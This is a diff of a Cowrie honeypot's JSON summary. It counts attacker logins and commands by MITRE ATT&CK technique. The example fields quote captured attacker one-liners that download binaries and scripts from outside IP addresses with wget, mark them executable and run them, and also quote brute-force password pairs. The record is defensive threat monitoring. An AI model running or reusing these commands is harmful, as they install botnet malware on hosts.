@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-08-18 11:00:12",
+  "generated": "2026-08-18 12:03:37",
   "totals": {
-    "commands": 7193,
-    "login_failed": 3888,
-    "login_success": 2293,
-    "sessions": 3960
+    "commands": 8107,
+    "login_failed": 4187,
+    "login_success": 2549,
+    "sessions": 4250
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 3888,
+      "count": 4187,
       "examples": [
         "root / 19801024",
         "root / sunsunsun",
@@ -21,14 +21,14 @@
         "root / 826826826"
       ],
       "first": "2026-08-18T00:00:03.054815Z",
-      "last": "2026-08-18T10:59:39.284232Z",
-      "unique_ips": 48
+      "last": "2026-08-18T12:00:14.008898Z",
+      "unique_ips": 55
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 2293,
+      "count": 2549,
       "examples": [
         "enable\\x00 / linuxshell\\x00",
         "root / 123@@@",
@@ -37,14 +37,14 @@
         "enable\\x00 / system\\x00"
       ],
       "first": "2026-08-18T00:06:39.840434Z",
-      "last": "2026-08-18T10:59:39.730648Z",
-      "unique_ips": 29
+      "last": "2026-08-18T12:00:14.447114Z",
+      "unique_ips": 35
     },
     {
       "id": "T1222.002",
       "name": "File and Directory Permissions Modification: Linux and Mac",
       "tactic": "Defense Evasion",
-      "count": 73,
+      "count": 96,
       "examples": [
         "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://31.77.227.121/bins/pmips; chmod 777 pmips; ./pmips; r",
         "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://31.77.227.121/bins/x86_64; chmod 777 x86_64; ./x86_64",
@@ -53,14 +53,14 @@
         "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://31.77.227.121/bins/parm5; chmod 777 parm5; ./parm5; r"
       ],
       "first": "2026-08-18T02:18:51.232788Z",
-      "last": "2026-08-18T10:02:47.887780Z",
-      "unique_ips": 8
+      "last": "2026-08-18T11:56:54.985263Z",
+      "unique_ips": 11
     },
     {
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 32,
+      "count": 43,
       "examples": [
         "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://31.77.227.121/bins/pmips; chmod 777 pmips; ./pmips; r",
         "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://31.77.227.121/bins/x86_64; chmod 777 x86_64; ./x86_64",
@@ -69,8 +69,8 @@
         "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://31.77.227.121/bins/parm5; chmod 777 parm5; ./parm5; r"
       ],
       "first": "2026-08-18T02:18:51.232788Z",
-      "last": "2026-08-18T10:02:48.329957Z",
-      "unique_ips": 8
+      "last": "2026-08-18T11:50:39.824340Z",
+      "unique_ips": 10
     },
     {
       "id": "T1082",
@@ -91,14 +91,14 @@
       "id": "T1033",
       "name": "System Owner/User Discovery",
       "tactic": "Discovery",
-      "count": 6,
+      "count": 7,
       "examples": [
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
         "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || "
       ],
       "first": "2026-08-18T03:14:17.803787Z",
-      "last": "2026-08-18T08:23:43.706748Z",
-      "unique_ips": 6
+      "last": "2026-08-18T11:49:59.934751Z",
+      "unique_ips": 7
     },
     {
       "id": "T1059.004",
@@ -127,88 +127,113 @@
       "first": "2026-08-18T04:38:14.387524Z",
       "last": "2026-08-18T10:02:47.887780Z",
       "unique_ips": 3
+    },
+    {
+      "id": "T1070.003",
+      "name": "Indicator Removal: Clear Command History",
+      "tactic": "Defense Evasion",
+      "count": 2,
+      "examples": [
+        "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://176.65.139.228:6677/Exodus.sh; chmod +x Exodus.sh; ./",
+        "#!/bin/bash\ncd /tmp || cd /var/run || cd /mnt || cd /root || cd /\nwget http://176.65.139.228:6677/bins/x86; wget http://"
+      ],
+      "first": "2026-08-18T11:08:15.573364Z",
+      "last": "2026-08-18T11:08:16.484896Z",
+      "unique_ips": 1
+    },
+    {
+      "id": "T1083",
+      "name": "File and Directory Discovery",
+      "tactic": "Discovery",
+      "count": 1,
+      "examples": [
+        "ls /"
+      ],
+      "first": "2026-08-18T11:08:14.467451Z",
+      "last": "2026-08-18T11:08:14.467451Z",
+      "unique_ips": 1
     }
   ],
   "unmapped": [
     [
       "system",
-      2269
+      2522
     ],
     [
       "shell",
-      2268
+      2522
     ],
     [
       "sh",
-      2268
+      2522
     ],
     [
       "/bin/busybox",
-      259
-    ],
-    [
-      "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"",
-      8
-    ],
-    [
-      "cd /proc && cat self/cmdline",
-      7
+      266
     ],
     [
       "enable",
-      5
+      13
     ],
     [
       "linuxshell",
-      5
+      13
+    ],
+    [
+      "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"",
+      10
+    ],
+    [
+      "cd /proc && cat self/cmdline",
+      9
     ],
     [
       "enablelinuxshell",
-      5
+      7
     ],
     [
       "ping ;sh",
-      5
+      7
     ],
     [
-      "busybox",
-      3
+      ">/tmp/.codi && cd /tmp/",
+      6
     ],
     [
-      "RPMA",
-      1
+      ">/var/.codi && cd /var/",
+      6
     ],
     [
-      "AMOO",
-      1
+      ">/dev/.codi && cd /dev/",
+      6
     ],
     [
-      "echo SHELL_TEST",
-      1
+      ">/mnt/.codi && cd /mnt/",
+      6
     ],
     [
-      "/bin/busybox TEST",
-      1
+      ">/var/run/.codi && cd /var/run/",
+      6
     ],
     [
-      "cat /proc",
-      1
+      ">/var/tmp/.codi && cd /var/tmp/",
+      6
     ],
     [
-      "./",
-      1
+      ">/.codi && cd /",
+      6
     ],
     [
-      "/bin/busybox MIORI",
-      1
+      ">/dev/netslink/.codi && cd /dev/netslink/",
+      6
     ],
     [
-      "Connection: close",
-      1
+      ">/dev/shm/.codi && cd /dev/shm/",
+      6
     ],
     [
-      "command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3",
-      1
+      ">/bin/.codi && cd /bin/",
+      6
     ]
   ]
 }
